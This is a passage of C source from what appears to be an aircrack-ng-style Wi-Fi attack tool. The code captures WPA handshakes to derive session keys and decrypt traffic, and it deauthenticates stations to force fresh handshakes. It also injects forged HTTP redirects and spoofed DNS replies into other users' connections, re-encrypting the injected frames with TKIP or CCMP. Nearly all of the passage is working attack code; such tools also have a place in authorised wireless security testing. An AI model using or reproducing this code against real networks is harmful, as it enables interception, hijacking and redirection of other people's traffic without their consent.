    struct ieee80211_frame *p_res802 = (struct ieee80211_frame *)pkt;

    //IF TODS
    if(p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
    {
        return (u_int8_t*) &p_res802->i_addr2;
    }
    //IF FROMDS
    else if(p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
    {
        return (u_int8_t*) &p_res802->i_addr1;
    }

    return NULL;
}

static inline u_int8_t* packet_get_bssid_80211( u_int8_t* pkt )
{
    struct ieee80211_frame *p_res802 = (struct ieee80211_frame *)pkt;

    //IF TODS
    if(p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
    {
        return (u_int8_t*) &p_res802->i_addr1;
    }
    //IF FROMDS
    else if(p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
    {
        return (u_int8_t*) &p_res802->i_addr2;
    }

    return NULL;
}

void packet_turnaround_80211( u_int8_t* pkt )
{
    struct ieee80211_frame *p_res802 = (struct ieee80211_frame *)pkt;
    u_int8_t tmp_mac[IEEE80211_ADDR_LEN] = {0};

    //IF TODS, flip to FROMDS
    if(p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
    {
        p_res802->i_fc[1] = p_res802->i_fc[1] & ~(char)IEEE80211_FC1_DIR_TODS;
        p_res802->i_fc[1] = p_res802->i_fc[1] | IEEE80211_FC1_DIR_FROMDS;
        
    }
    //IF FROMDS, Flip to TODS
    else if(p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
    {
        p_res802->i_fc[1] = p_res802->i_fc[1] & ~IEEE80211_FC1_DIR_FROMDS;
        p_res802->i_fc[1] = p_res802->i_fc[1] | IEEE80211_FC1_DIR_TODS;
    }

    memcpy(tmp_mac,           p_res802->i_addr1, IEEE80211_ADDR_LEN);
    memcpy(p_res802->i_addr1, p_res802->i_addr2, IEEE80211_ADDR_LEN);
    memcpy(p_res802->i_addr2, tmp_mac,           IEEE80211_ADDR_LEN);

    return;
}

void packet_turnaround_ip( struct ip_frame *p_resip )
{ 
    //Switch the IP source and destination addresses
    u_int32_t tmp_addr = p_resip->saddr;
    p_resip->saddr = p_resip->daddr;
    p_resip->daddr = tmp_addr;
    p_resip->ttl = 63;
}

void packet_turnaround_ip_udp( struct udp_hdr *p_resudp )
{ 
    //Switch the UDP source and destination Ports
    u_int16_t tmp_port = p_resudp->sport;
    p_resudp->sport = p_resudp->dport;
    p_resudp->dport = tmp_port;
}

void packet_turnaround_ip_tcp( struct tcp_hdr *p_restcp, u_int32_t next_seq_hint )
{ 
    //Switch the TCP source and destination Ports
    u_int16_t tmp_port = p_restcp->sport;
    p_restcp->sport = p_restcp->dport;
    p_restcp->dport = tmp_port;

    u_int32_t tmp_num = p_restcp->seqnu;
    p_restcp->seqnu = p_restcp->ack_seq;
    p_restcp->ack_seq = tmp_num;
    
    // Increment seq by the length of the data in the current packet
    tmp_num = ntohl(p_restcp->ack_seq) + next_seq_hint; 

    p_restcp->ack_seq = htonl(tmp_num);
}

u_int16_t dns_name_end( u_int8_t* buff, u_int16_t maxlen )
{
    u_int8_t *ptr = buff;
    u_int8_t count = 0;
    u_int16_t offset = 0;

    while(offset < maxlen)
    {
        count = ptr[0] +1;
        offset += count;
        ptr += count ;

        if(count == 1)
            break;
    };

    return offset;
}

int strip_ccmp_header(u_int8_t* h80211, int caplen, unsigned char PN[6])
{
    int is_a4, z, is_qos;

    is_a4 = ( h80211[1] & 3 ) == 3;
    is_qos = ( h80211[0] & 0x8C ) == 0x88;
    z = 24 + 6 * is_a4;
    z += 2 * is_qos;

    // Insert CCMP header
    //memmove( h80211+z+8, h80211+z, caplen-z );
    PN[5] = h80211[z + 0];
    PN[4] = h80211[z + 1];
    PN[3] = h80211[z + 4];
    PN[2] = h80211[z + 5];
    PN[1] = h80211[z + 6];
    PN[0] = h80211[z + 7];
    memmove( h80211+z, h80211+z+8, caplen-z );

    //return new length, encrypt_ccmp() expects on encryption artifacts in frame,
    // and states frame is encrypted in place resulting in extra 16 bytes?
    return caplen - 16;
}

void encrypt_data_packet(u_int8_t* packet, int length, struct WPA_ST_info* sta_cur )
{
    if ( (NULL == sta_cur) || (! sta_cur->valid_ptk) )  { return; }
    else
    {
        // if the PTK is valid, try to decrypt
        if( sta_cur->keyver == 1 )
        {
            //printf("TKIP packet length = %d\n", length );
            //hexDump("full before encrypt", packet, length);           
            encrypt_tkip( packet, length, sta_cur->ptk);
        }
        else{
            //printf("CCMP Packet\n");
            //This will take the current packet that already 
            // has a ccmp header and strip it and return the PN
            // This is required so that we comply with the 
            // encrypt_ccmp function in crypto.c
            unsigned char PN[6] = {0};
            length = strip_ccmp_header(packet, length, PN);
            encrypt_ccmp( packet, length, sta_cur->ptk + 32, PN );
        }

    }
}

//Global packet buffer for use in building response packets
uint8_t pkt[2048] = {0};

void process_unencrypted_data_packet(u_int8_t* packet, u_int32_t length, u_int32_t debug)
{
    if (debug) hexDump("full", packet, length);
    
    u_int8_t* packet_start = packet;
    int packet_start_length = length;
    char extra_enc_length = 0;
    //char flag_reencypt

    struct ieee80211_frame* wfrm = (struct ieee80211_frame*)packet;
    
    int size_80211hdr = sizeof(struct ieee80211_frame);
    
    //Check to see if we have a QOS 802.11 frame
    if(IEEE80211_FC0_SUBTYPE_QOS & wfrm->i_fc[0]) { 
        size_80211hdr = sizeof(struct ieee80211_qosframe);
        //Here's an idea from a presentation out of NL, assign this packet 
        // a QOS priority that isn't used in order to not collide with 
        // squence numbers from the real AP/STA
        struct ieee80211_qosframe* wqfrm = (struct ieee80211_qosframe*)packet;
        wqfrm->i_qos[0] = 0x7;
    }

    //Increment the 802.11 sequence number
    uint16_t *p_seq = (uint16_t *)&wfrm->i_seq;
    uint16_t pkt_sent = (*p_seq) >> 4 ;
    pkt_sent += 1;
    //printf("seq = %d\n", pkt_sent);
    packet[22] = (pkt_sent & 0x0000000F) << 4;
    packet[23] = (pkt_sent & 0x00000FF0) >> 4;    

    //Skip over the 802.11 header
    packet += size_80211hdr;
    length -= size_80211hdr;

    // If the protected bit is set, we decrypted this packet and passed it on here
    // Calculate the correct offset to the start of the data
    if(IEEE80211_FC1_WEP & wfrm->i_fc[1]) { 
        if( 0 == (packet[3] & 0x20) )
        {
            //this is a regular WEP IV field
            extra_enc_length = 4;
        }
        else
        {
            //this is a Extended IV field
            extra_enc_length = 8;
        }
        packet += extra_enc_length;
        length -= extra_enc_length;    
        size_80211hdr += extra_enc_length;
    }
    
    struct llc_frame * p_llc = (struct llc_frame*)packet;
    if (debug) hexDump("llc", p_llc, length);
    packet += sizeof(struct llc_frame);
    length -= sizeof(struct llc_frame);
    // Sanity check... 
    // We should have a data packet. Check for LLC 
    if(p_llc->i_dsap == 0xAA && p_llc->i_ssap == 0xAA)
    { 
        // If it's an EAPOL frame, let's capture the handshake
        if(ETHTYPE_8021x == p_llc->i_ethtype)
        {
            struct dot1x_hdr* p_d1x = (struct dot1x_hdr*) packet;
            struct radius_hdr* p_rhdr= (struct radius_hdr*)(packet + sizeof(struct dot1x_hdr));

            // Must be a key frame, and must be RSN (2) or WPA (254)
            if( (DOT1X_ID_EAP_KEY != p_d1x->idtype) || 
                (2 != p_rhdr->code && 254 != p_rhdr->code))
            { return; }

            // frame 1 of 4: Pairwise == 1, Install == 0, Ack == 1, MIC == 0, Secure == 0 */
            if( 1 == p_rhdr->key_type  && 0 == p_rhdr->key_install &&
                1 == p_rhdr->key_ack   && 0 == p_rhdr->key_mic        )
            {
                /* set authenticator nonce */
                memcpy( opt.st_cur->anonce, p_rhdr->wpa_nonce, 32 );
                printf(COL_4WAYHS "------> #1, Captured anonce " COL_REST);
                PRINTMAC(opt.st_cur->stmac);
            }

            /* frame 2 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1, Secure == 0 */
            /* frame 4 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1, Secure == 1 */
            if( 1 == p_rhdr->key_type  && 0 == p_rhdr->key_install &&
                0 == p_rhdr->key_ack   && 1 == p_rhdr->key_mic        )
            {
                if( memcmp( p_rhdr->wpa_nonce, ZERO, 32 ) != 0 )
                {
                    /* set supplicant nonce */
                    memcpy( opt.st_cur->snonce, p_rhdr->wpa_nonce, 32 );
                    printf(COL_4WAYHS "------> #2, Captured snonce " COL_REST);
                }
                else { printf(COL_4WAYHS "------> #4, Captured        " COL_REST); }
                PRINTMAC(opt.st_cur->stmac);

                opt.st_cur->eapol_size = ntohs(p_d1x->length) + 4; //4 is sizeof radius header

                if (length < opt.st_cur->eapol_size || opt.st_cur->eapol_size == 0 ||
                    opt.st_cur->eapol_size > sizeof(opt.st_cur->eapol))
                {
                        // Ignore the packet trying to crash us.
                        printf("Caught a packet trying to crash us, sneaky bastard!\n");
                        hexDump("Offending Packet:", packet, length);
                        opt.st_cur->eapol_size = 0;
                        return;
                }
                // Save the MIC
                memcpy( opt.st_cur->keymic, p_rhdr->wpa_key_mic, 16 );
                // Save the whole EAPOL frame
                memcpy( opt.st_cur->eapol, p_d1x, opt.st_cur->eapol_size );
                // Clearing the MIC in the saves EAPOL frame
                memset( opt.st_cur->eapol + 81, 0, 16 );

                // copy the key descriptor version 
                opt.st_cur->keyver = p_rhdr->key_ver;
            }

            /* frame 3 of 4: Pairwise == 1, Install == 1, Ack == 1, MIC == 1, Secure == 1 */
            if( 1 == p_rhdr->key_type  && 1 == p_rhdr->key_install &&
                1 == p_rhdr->key_ack   && 1 == p_rhdr->key_mic        )
            {
                if( memcmp( p_rhdr->wpa_nonce, ZERO, 32 ) != 0 )
                {
                    /* set authenticator nonce (again) */
                    memcpy( opt.st_cur->anonce, p_rhdr->wpa_nonce, 32 );
                    printf(COL_4WAYHS "------> #3, Captured anonce " COL_REST);
                    PRINTMAC(opt.st_cur->stmac); 
                }
                //WARNING: Serious Code Reuse here!!!
                opt.st_cur->eapol_size = ntohs(p_d1x->length) + 4; //4 is sizeof radius header

                if (length < opt.st_cur->eapol_size || opt.st_cur->eapol_size == 0 ||
                    opt.st_cur->eapol_size > sizeof(opt.st_cur->eapol))
                {
                        // Ignore the packet trying to crash us.
                        printf("Caught a packet trying to crash us, sneaky bastard!\n");
                        hexDump("Offending Packet:", packet, length);
                        opt.st_cur->eapol_size = 0;
                        return;
                }
                // Save the MIC
                memcpy( opt.st_cur->keymic, p_rhdr->wpa_key_mic, 16 );
                // Save the whole EAPOL frame
                memcpy( opt.st_cur->eapol, p_d1x, opt.st_cur->eapol_size );
                // Clearing the MIC in the saves EAPOL frame
                memset( opt.st_cur->eapol + 81, 0, 16 );

                // copy the key descriptor version 
                opt.st_cur->keyver = p_rhdr->key_ver;
            }

            memset(opt.st_cur->ptk, 0, 80);

            //opt.st_cur->valid_ptk = calc_ptk( opt.st_cur, opt.st_cur->pmk );
            opt.st_cur->valid_ptk = calc_ptk( opt.st_cur, opt.pmk );
            if(1 == opt.st_cur->valid_ptk)
            {
                
                hexDump(COL_4WAYKEY "MIC"    COL_4WAYKEYDATA, opt.st_cur->keymic, 16);
                hexDump(COL_4WAYKEY "stmac"  COL_4WAYKEYDATA, opt.st_cur->stmac, 6);
                hexDump(COL_4WAYKEY "bssid"  COL_4WAYKEYDATA, opt.st_cur->bssid, 6);
                hexDump(COL_4WAYKEY "anonce" COL_4WAYKEYDATA, opt.st_cur->anonce, 32);
                hexDump(COL_4WAYKEY "snonce" COL_4WAYKEYDATA, opt.st_cur->snonce, 32);
                hexDump(COL_4WAYKEY "keymic" COL_4WAYKEYDATA, opt.st_cur->keymic, 16);
                hexDump(COL_4WAYKEY "epol"   COL_4WAYKEYDATA, opt.st_cur->eapol, opt.st_cur->eapol_size);
                printf(COL_BLUE "Valid key: "); PRINTMAC(opt.st_cur->stmac); printf("\n" COL_REST);
            }
            
            return;
        }
        else if((short)ETHTYPE_IP == p_llc->i_ethtype)
        {
            //We have an IP frame
            int offset_ip = size_80211hdr + sizeof(struct llc_frame);
            int offset_proto = offset_ip + sizeof(struct ip_frame);

            struct ip_frame* p_ip = (struct ip_frame*)packet;
            packet += sizeof(struct ip_frame);
            length -= sizeof(struct ip_frame);
            
            if((short)PROTO_TCP == p_ip->protocol)
            {
                
                struct tcp_hdr *p_tcp = (struct tcp_hdr *)packet;
                if (80 == ntohs(p_tcp->dport))
                {
                    length += extra_enc_length;
                    // TCP header size = first 4bits * 32 / 8, same as first 4bits *4
                    u_int32_t hdr_size = p_tcp->doff*4;
                    u_int8_t *p_http = packet + hdr_size;
                    u_int32_t l_http = length - hdr_size;
                    //Find a GET
                    if( (1 == opt.flag_http_hijack) &&
                         (p_http[0] == 0x47 && 
                          p_http[1] == 0x45 &&
                          p_http[2] == 0x54)
                      )
                    { 
                        int ret = fnmatch((const char *)opt.p_hijack_str, (const char *)p_http, FNM_PERIOD);
                        if(0 == ret){
                            printf("This frame matched a term we are looking for\n");
                            if(NULL != opt.p_redir_url)
                            {
                                char *p_hit = strstr((const char *)p_http,(const char *)opt.p_redir_url);
                                if(NULL != p_hit)
                                { printf("Caught our own redirect, ignoring this packet\n"); return; }
                                else 
                                { printf("this is not a redirect to our server\n");                  }
                            }
                        }
                        else{
                            printf("pattern %s, not in this packet\n",opt.p_hijack_str);
                            return;
                        }

                        memcpy( pkt, packet_start, packet_start_length );

                        struct tcp_hdr *p_restcp = (struct tcp_hdr *)(pkt + offset_proto);
                        struct ip_frame* p_resip = (struct ip_frame*)(pkt + offset_ip);
                        u_int32_t res_length = packet_start_length; // This only initially until we replace content

                        //-----------------------------------------------------------------------------
                        //Do some magic here... to create a frame to close the server connection
                        memcpy( tmpbuf, pkt, packet_start_length );
                        struct ip_frame *p_resip_ack = (struct ip_frame*)(tmpbuf + offset_ip);
                        struct tcp_hdr *p_restcp_ack = (struct tcp_hdr *)(tmpbuf + offset_proto);

                        res_length = offset_proto + hdr_size + extra_enc_length; // have to account for MIC
                        p_resip_ack->id = htons(ntohs(p_resip_ack->id) + 1023);
                        p_resip_ack->tot_len = htons(hdr_size + sizeof(struct ip_frame));
                        p_resip_ack->check = 0; p_resip_ack->check = calcsum((unsigned short *)p_resip_ack, sizeof(struct ip_frame));

                        // We could try some stuff with tcp reset
                        //p_restcp_ack->fin = 1;
                        //p_restcp_ack->ack = 0;
                        //p_restcp_ack->psh = 0;
                        p_restcp_ack->rst = 1;

                        //Lets calculate the TCP checksum
                        p_restcp_ack->checksum = 0;
                        p_restcp_ack->checksum = calcsum_tcp((void *)p_restcp_ack, (hdr_size), p_resip_ack->saddr, p_resip_ack->daddr);
                      
                        int tmpbuf_len = res_length;
                        //Going to send the packet later, after we send the redirect...
                        //if( send_packet( tmpbuf, res_length ) != 0 )
                        //    printf("ERROR: couldn't send Ack\n");
                        //-----------------------------------------------------------------------------
                        //The silly extra TCP options were messing with me, Packets with TCP options
                        // Weren't being accepted. Probably some silly offset miscalculation. But for 
                        // Our purposes, just cut these out.
                        // So get those options out of there
                        int diff = hdr_size - sizeof(struct tcp_hdr);
                        if(0 != diff)
                        {
                            hdr_size = sizeof(struct tcp_hdr); 
                            p_resip->tot_len = htons(ntohs(p_resip->tot_len) - diff);
                        }
                        //Update the TCP header with the new size (if changed)
                        p_restcp->doff = hdr_size/4;

                        //start manipulating the packet to turn it around back to the sender
                        packet_turnaround_80211(  pkt      );
                        packet_turnaround_ip(     p_resip  );
                        packet_turnaround_ip_tcp( p_restcp , ntohs(p_resip->tot_len) - sizeof(struct ip_frame) - hdr_size );

                        //Pointer to the start of the http section
                        p_http = pkt + offset_proto + hdr_size;
                        l_http = strlen(opt.p_redir_pkt_str);

                        //Copy the http frame we wish to send
                        memcpy(p_http, opt.p_redir_pkt_str, l_http);
                        res_length = offset_proto + hdr_size + l_http + extra_enc_length; // have to account for MIC

                        //Set checksum to zero before calculating...
                        p_resip->frag_off = 0x0000;
                        // Incrementing the ID by something, Could try to calculate this... 
                        p_resip->id = htons(ntohs(p_resip->id) + 1025);
                        p_resip->tot_len = htons(l_http + hdr_size + sizeof(struct ip_frame));
                        p_resip->check = 0; p_resip->check = calcsum((unsigned short *)p_resip, sizeof(struct ip_frame));

                        //Lets calculate the TCP checksum
                        p_restcp->checksum = 0;
                        p_restcp->checksum = calcsum_tcp((void *)p_restcp, (hdr_size + l_http), p_resip->saddr, p_resip->daddr);

                        if(IEEE80211_FC1_WEP & wfrm->i_fc[1]){
                            if( opt.st_cur->keyver == 1 )
                            {
                                res_length += 4;  
                            }
                            encrypt_data_packet(pkt, res_length, opt.st_cur);
                            encrypt_data_packet(tmpbuf, tmpbuf_len, opt.st_cur); 
                        }

                        printf(COL_HTTPINJECT "---> Injecting Redirect Packet to: " COL_HTTPINJECTDATA);
                        PRINTMAC(opt.st_cur->stmac);
                        printf(COL_REST);

                        if( send_packet( pkt, res_length ) != 0 )
                            printf("Error Sending Packet\n");
                        printf("\n");
                        //Uncomment to send RST packet to the server
                        //if( send_packet( tmpbuf, tmpbuf_len ) != 0 )
                        //    printf("ERROR: couldn't send Ack\n");
                        return;
                    }
                }
            }
            else if((short)PROTO_UDP == p_ip->protocol && opt.flag_dnsspoof)
            {
                struct udp_hdr *p_udp = (struct udp_hdr *)packet;

                //DNS packet
                if (53 == ntohs(p_udp->dport))
                {
                    hexDump("DNS", (void*)packet, length);
                    memcpy( pkt, packet_start, packet_start_length );
                    packet_turnaround_80211(                      pkt               );
                    packet_turnaround_ip(     (struct ip_frame *)(pkt + offset_ip)  );
                    packet_turnaround_ip_udp( (struct udp_hdr  *)(pkt +offset_proto));

                    struct udp_hdr *p_resudp = (struct udp_hdr *)(pkt + offset_proto);

                    int dns_offset = offset_proto + sizeof(struct udp_hdr);
                    u_int8_t *p_dns = packet_start + dns_offset;
                    u_int8_t *p_resdns = pkt + dns_offset;

                    // Copy the beginning part of the packet
                    memcpy(p_resdns, DNS_RESP_PCKT_1, sizeof(DNS_RESP_PCKT_1));
                    struct dns_query *p_dnsq = (struct dns_query *)p_dns;
                    int dns_qlen = dns_name_end((u_int8_t*)&p_dnsq->qdata, packet_start_length);

                    // Copy the request DNS name into the response
                    memcpy(p_resdns + sizeof(DNS_RESP_PCKT_1)-1,  (void*)&p_dnsq->qdata, dns_qlen);
                    // Copy the rest of the DNS packet
                    memcpy(p_resdns + sizeof(DNS_RESP_PCKT_1)-1 + dns_qlen, DNS_RESP_PCKT_2, sizeof(DNS_RESP_PCKT_2));
                    //Calculate the new resp length
                    int dns_resplen = sizeof(DNS_RESP_PCKT_1)-1 + dns_qlen + sizeof(DNS_RESP_PCKT_2);

                    struct sockaddr_in s_in;
                    inet_pton(AF_INET,"127.0.0.1",&s_in); //Website will work
                    memcpy(p_resdns + dns_resplen - 5, &s_in, 4); 
                    //int ret = inet_aton("192.168.1.102", &s_in);
                    //int ret = inet_aton("50.89.71.10", &s_in);

                    //Copy over our own specified IP address
                    //memcpy(p_resdns + dns_resplen - 5, &opt.p_dnsspoof_ip, 4); 

                    //copy the Transaction ID 
                    p_resdns[0] = p_dns[0];
                    p_resdns[1] = p_dns[1];

                    struct ip_frame* p_resip = (struct ip_frame*)(pkt + offset_ip);
                    p_resip->tot_len = htons(dns_resplen + sizeof(struct udp_hdr) + sizeof(struct ip_frame));
                    //Set checksum to zero before calculating...
                    p_resip->check = 0; p_resip->check = calcsum((unsigned short *)p_resip, sizeof(struct ip_frame));

                    p_resudp->len = htons(dns_resplen +sizeof(struct udp_hdr));
                    p_resudp->checksum = 0;
                    p_resudp->checksum = calcsum_udp((void *)p_resudp, ntohs(p_resudp->len), p_resip->saddr, p_resip->daddr);

                    hexDump( "sending DNS Response:", pkt, packet_start_length );

                    packet_start_length = dns_offset + dns_resplen;
                    if(IEEE80211_FC1_WEP & wfrm->i_fc[1]){
                        if( opt.st_cur->keyver == 1 )
                        {
                            packet_start_length += 4;
                        }

                        packet_start_length += extra_enc_length ;
                        encrypt_data_packet(pkt, packet_start_length, opt.st_cur);
                        //hexDump("Full encrypted", pkt,packet_start_length);

                    }

                    if( send_packet( pkt, packet_start_length ) != 0 )
                        printf("Error Sending Packet\n");

                    return;
                }

            }

            else if((1 == opt.flag_icmp_resp) && (short)PROTO_ICMP == p_ip->protocol)
            {
                struct icmp *p_icmp = (struct icmp *)packet;
                if (p_icmp->icmp_type == 0)
                {
                    //printf("ICMP Reply, %d, %d\n", p_icmp->icmp_id, p_icmp->icmp_seq);
                }
                if (p_icmp->icmp_type == 8)
                {
                    printf("ICMP Request Caught, %d, %d\n", p_icmp->icmp_id, p_icmp->icmp_seq);

                    //copy the original Packet to our response packet buffer
                    memcpy( pkt, packet_start, packet_start_length);

                    packet_turnaround_80211(pkt);
                    packet_turnaround_ip((struct ip_frame *)(pkt + offset_ip));

                    //Point to the IP frame
                    struct ip_frame* p_resip = (struct ip_frame*)(pkt + offset_ip);
                    //Set checksum to zero before calculating checksum... 
                    p_resip->check = 0; 
                    p_resip->check = calcsum((unsigned short *)p_resip, sizeof(struct ip_frame));

                    struct icmp *p_resicmp = (struct icmp *)(pkt + size_80211hdr + sizeof(struct llc_frame) + sizeof(struct ip_frame));
                    //Set the ICMP type as response
                    p_resicmp->icmp_type = 0;

                    //Calculate how much data there is to calculate checksum over
                    int icmp_length = packet_start_length
                                     - (size_80211hdr + sizeof(struct llc_frame) + sizeof(struct ip_frame))
                                     - extra_enc_length; // Don't forget extra MIC at the end of the frame

                    if( opt.st_cur->keyver == 1 )
                    {
                        icmp_length -= 4;
                    }
                    p_resicmp->icmp_cksum = 0;
                    p_resicmp->icmp_cksum = calcsum((unsigned short*)p_resicmp, icmp_length);

                    if(IEEE80211_FC1_WEP & wfrm->i_fc[1]){
                        encrypt_data_packet(pkt, packet_start_length, opt.st_cur);
                    }

                    printf("Sending ICMP response\n");
                    if( send_packet( pkt, packet_start_length) != 0 )
                        printf("Error Sending Packet\n");

                    return;
                }

            }
        }
    }
}


bool is_adhoc_frame(u_int8_t* packet)
{
    u_int8_t *p_stmac = packet_get_sta_80211(packet);

    if (NULL == p_stmac) { return TRUE; }
    else                 { return FALSE; }
}

bool find_station_in_db(u_int8_t *p_stmac)
{
    opt.st_prv = NULL;
    opt.st_cur = opt.st_1st;

    while( opt.st_cur != NULL )
    {
        if( ! memcmp( opt.st_cur->stmac, p_stmac, 6 ) )
            break;

        opt.st_prv = opt.st_cur;
        opt.st_cur = opt.st_cur->next;
    }

    if( NULL == opt.st_cur )
        //If not fount, opt.st_cur == NULL
        return FALSE;
    else
        //If found, opt.st_cur == p_stmac
        return TRUE;
}

bool alloc_new_station_in_db()
{
    opt.st_cur = (struct WPA_ST_info *)malloc( sizeof(struct WPA_ST_info) );

    if( NULL == opt.st_cur)
    {
        perror( "station malloc failed" );
        return FALSE;
    }
    //Zero out memory of newly allocated structure
    memset( opt.st_cur, 0, sizeof( struct WPA_ST_info ) );
    return TRUE;
}

static inline bool is_wfrm_encrypted(struct ieee80211_frame* wfrm)
{
    return (wfrm->i_fc[1] & IEEE80211_FC1_WEP);
}

static inline bool is_length_lt_wfrm(int length)
{
    return ((int)sizeof(struct ieee80211_frame) >= length);
}

static inline bool mac_is_multi_broadcast(unsigned char stmac[6])
{
    if ((0xFF == stmac[0]) && (0xFF == stmac[1]))  return TRUE;
    if ((0x33 == stmac[0]) && (0x33 == stmac[1]))  return TRUE;
    return FALSE;
}

void process_station_data(u_int8_t* packet, int length)
{
    if (is_length_lt_wfrm(length)) return;

    struct ieee80211_frame* wfrm = (struct ieee80211_frame*)packet;

    u_int8_t *p_stmac = packet_get_sta_80211(packet);
    u_int8_t *p_bssid = packet_get_bssid_80211(packet);
 
    if( ! find_station_in_db(p_stmac) )
    {
        if( FALSE == alloc_new_station_in_db()) { return; }

        if( opt.st_1st == NULL )
            opt.st_1st = opt.st_cur;
        else
            opt.st_prv->next = opt.st_cur;

        memcpy( opt.st_cur->stmac, p_stmac, 6 );
        memcpy( opt.st_cur->bssid, p_bssid, 6 );

        if( TRUE == opt.flag_verbose)
        {
            printf(COL_NEWSTA "Added new station\n" COL_NEWSTADATA);
            printf("Station = "); PRINTMAC(p_stmac);
            printf("BSSID   = "); PRINTMAC(opt.st_cur->bssid);
            printf(COL_REST);
            //Attempt to force a de-auth and reconnect automagically ;)
        }

        if( (is_wfrm_encrypted(wfrm)) && (TRUE == opt.deauth) )
        {
            //This frame was encrypted, so send some deauths to the station
            // Hoping to reauth/reassoc to force 4 way handshake
            if (FALSE == mac_is_multi_broadcast(opt.st_cur->stmac))
            {
                printf("Doing deauth\n");
                deauth_station(opt.st_cur);
                printf("\nFinished Deauth Attempt\n");
            }
        }

    }
}

static inline bool wfrm_is_tods(struct ieee80211_frame* wfrm)
{
    return (wfrm->i_fc[1] & IEEE80211_FC1_DIR_TODS);
}

static inline bool wfrm_is_fromds(struct ieee80211_frame* wfrm)
{
    return (wfrm->i_fc[1] & IEEE80211_FC1_DIR_FROMDS);
}

static inline bool is_wfrm_qos(struct ieee80211_frame* wfrm)
{
    return (IEEE80211_FC0_SUBTYPE_QOS & wfrm->i_fc[0]);
}

bool is_wfrm_already_processed(u_int8_t* packet, int length)
{
    struct ieee80211_frame* wfrm = (struct ieee80211_frame*)packet;

    // check if we haven't already processed this packet 
    // If we have, just return, don't process packet twice
    u_int32_t crc = calc_crc_buf( packet, length );

    //IF TODS
    if( wfrm_is_tods(wfrm) )
    {
        if( crc == opt.st_cur->t_crc ) { return TRUE; }
        opt.st_cur->t_crc = crc;
    }
    //IF FROMDS
    else if( wfrm_is_fromds(wfrm) )
    {
        if( crc == opt.st_cur->f_crc ) { return TRUE; }
        opt.st_cur->f_crc = crc;
    }
    //this frame hasn't been processed yet
    return FALSE;
}

struct llc_frame* find_llc_frm_ptr(u_int8_t* packet, int length)
{
    if (is_length_lt_wfrm(length)) return NULL;

    int size_80211hdr = sizeof(struct ieee80211_frame);
    if ( is_wfrm_qos((struct ieee80211_frame*)packet) ) { size_80211hdr = sizeof(struct ieee80211_qosframe); }

    struct llc_frame * p_llc = (struct llc_frame*) (packet + size_80211hdr);
    return p_llc;
}

void process_wireless_data_packet(u_int8_t* packet, int length)
{
    u_int8_t* packet_start = packet;
    int packet_start_length = length;

    struct ieee80211_frame* wfrm = (struct ieee80211_frame*)packet;

    if( is_adhoc_frame(packet) ) { return; }
    //u_int8_t *p_stmac = packet_get_sta_80211(packet);

    //TEMP DEBUG CAESURUS
    //if(p_stmac[5] != 0x07) return;

    //process station,
    // if it exists, opt.st_cur will point to it
    // if it doesn't exist, it will create an entry
    //    with opt.st_cur pointing to it
    process_station_data(packet, length);

    if ( is_wfrm_already_processed(packet, length) ) { return; }

    struct llc_frame * p_llc = find_llc_frm_ptr(packet, length);
    if(NULL == p_llc) { return; }

    //Check to see if this is an encrypted frame
    if( 0xAA != p_llc->i_dsap  && 0xAA != p_llc->i_ssap )
    {
        // OK so it's not valid LLC, lets check WEP
        struct wep_frame * p_wep = (struct wep_frame*)packet;

        // check the extended IV flag
        // I copied from airdecap-ng, not actually sure about WEP and don't care at this point
        if( (wfrm->i_fc[1] & IEEE80211_FC1_WEP) && (0 != (p_wep->keyid & 0x20)) )
        {
            //Unsupported ;)
            printf("unsupported encryption\n");
            return;
        }
        else
        {
            if( opt.crypt != CRYPT_WPA ) { return; }
            //Apparently this is a WPA packet
            //Don't bother with this if we don't have a valid ptk for this station
            if ( (NULL == opt.st_cur) || (! opt.st_cur->valid_ptk) )  { return; }
            else
            {
                // if the PTK is valid, try to decrypt
                if( opt.st_cur->keyver == 1 )
                {
                    if( decrypt_tkip( packet_start, packet_start_length, opt.st_cur->ptk + 32 ) == 0 )
                    {
                        printf("TKIP decryption on this packet failed :( \n");
                        return;
                    }
                    //length -= 20;
                    //packet_start_length -= 20;
                }
                else
                {
                    if( decrypt_ccmp( packet_start, packet_start_length, opt.st_cur->ptk + 32 ) == 0 )
                    {
                        printf("CCMP decryption on this packet failed :( \n");
                        hexDump("failed to decrypt", packet_start, packet_start_length);
                        //printf("\n");
                        return;
                    }
                    //length -= 16;
                    //packet_start_length -= 16;
                }

                process_unencrypted_data_packet(packet_start,packet_start_length, 0);
                return;
            }
        }
    }
    else if(0xAA == p_llc->i_dsap && 0xAA == p_llc->i_ssap)
    {
        process_unencrypted_data_packet(packet_start,packet_start_length, 0);
    }
    return;

}

void process_wireless_packet(u_int8_t* packet, int length)
{
    struct ieee80211_frame* wfrm = (struct ieee80211_frame*)packet;
    short fc =  *wfrm->i_fc;

    if( (IEEE80211_FC0_TYPE_DATA & fc) )
    {
        process_wireless_data_packet(packet, length);
    }
    return;
}

int do_active_injection()
{
    struct timeval tv;
    fd_set rfds;
    int caplen, ret;
    int atime = 200;  
    memset(tmpbuf, 0, 4096);

    printf("opt.port_out = %d, opt.s_face = %s\n", opt.port_out, opt.s_face);
    if(opt.port_out > 0)
    {
        atime += 200;
        PCT; printf("Testing connection to injection device %s\n", opt.iface_out);
        ret = tcp_test(opt.ip_out, opt.port_out);
        if(ret != 0)
        {
            return( 1 );
        }
        printf("\n");

        /* open the replay interface */
        _wi_out = wi_open(opt.iface_out);
        if (!_wi_out)
            return 1;
        printf("\n");
        dev.fd_out = wi_fd(_wi_out);
        wi_get_mac(_wi_out, dev.mac_out);
        if(opt.s_face == NULL)
        {
            _wi_in = _wi_out;
            dev.fd_in = dev.fd_out;

            /* XXX */
            dev.arptype_in = dev.arptype_out;
            wi_get_mac(_wi_in, dev.mac_in);
        }
    }

    if(opt.s_face && opt.port_in > 0)
    {
        atime += 200;
        PCT; printf("Testing connection to capture device %s\n", opt.s_face);
        ret = tcp_test(opt.ip_in, opt.port_in);
        if(ret != 0)
        {
            return( 1 );
        }
        printf("\n");

        /* open the packet source */
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
